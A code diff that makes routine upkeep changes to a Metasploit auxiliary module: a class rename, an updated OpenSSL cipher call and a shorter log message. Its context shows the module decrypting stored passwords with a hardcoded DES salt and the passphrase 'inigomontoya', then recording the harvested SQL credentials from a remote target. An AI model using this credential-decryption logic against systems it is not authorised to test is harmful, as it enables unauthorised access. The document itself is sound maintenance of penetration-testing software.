@@ -6,7 +6,7 @@
 require 'msf/core'
 require 'openssl'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
@@ -44,7 +44,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def decrypt_password (ciphertext)
     salt = [-87, -101, -56, 50, 86, 53, -29, 3].pack('c*')
-    cipher = OpenSSL::Cipher::Cipher.new("DES")
+    cipher = OpenSSL::Cipher.new("DES")
     base_64_code = Rex::Text.decode_base64(ciphertext)
     cipher.decrypt
     cipher.pkcs5_keyivgen 'inigomontoya', salt, 19
@@ -119,7 +119,7 @@ class Metasploit3 < Msf::Auxiliary
           fail_with(Failure::Unknown, 'Could not resolve database server hostname.')
         end
 
-        print_status("#{peer} - Stored SQL credentials #{username}:#{password} for #{matches.captures[2]}")
+        print_status("Stored SQL credentials #{username}:#{password} for #{matches.captures[2]}")
         return
       end
     else
